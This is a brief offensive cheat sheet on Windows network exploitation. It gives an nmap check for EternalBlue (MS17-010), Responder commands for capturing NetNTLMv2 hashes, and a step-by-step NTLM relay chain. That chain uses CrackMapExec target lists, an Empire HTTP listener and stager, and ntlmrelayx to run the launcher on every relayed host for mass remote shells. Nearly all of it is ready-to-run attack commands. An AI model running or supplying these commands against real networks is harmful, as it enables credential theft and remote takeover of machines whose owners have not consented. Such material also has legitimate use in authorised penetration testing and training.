# Exploitation

### EternalBlue ms17-010

```python
nmap -p445 --script smb-vuln-ms17-010 <target>/24
```

### Responder to capture the NetNTLMv2 hash

```text
Responder -I eth0 -wrf
```

### Responder with NTLM relay and Empire

```python
# generates a list of hosts which have SMB-signing disabled
cme smb <CIDR> --gen-relay-list targets.txt

# edit Responder.conf to turn off the HTTP and SMB server.
# Start Responder
Responder -I eth0 -wrf

# Start up Empire, open a listener and create a so called stager, point it to your listener. 
./empire
uselistener http
set Port 81
execute
back
usestager multi/launcher
set Listener http
generate
agents

# Now copypaste the payload from Empire into the NTLMrelay command above. 
# This will execute the payload for every box it relays to and it should be raining shells very soon. 
# You will see a message in Empire saying it got an agent when it's successful. 
# You will also see hashes written in the terminal while it's running.
ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
```

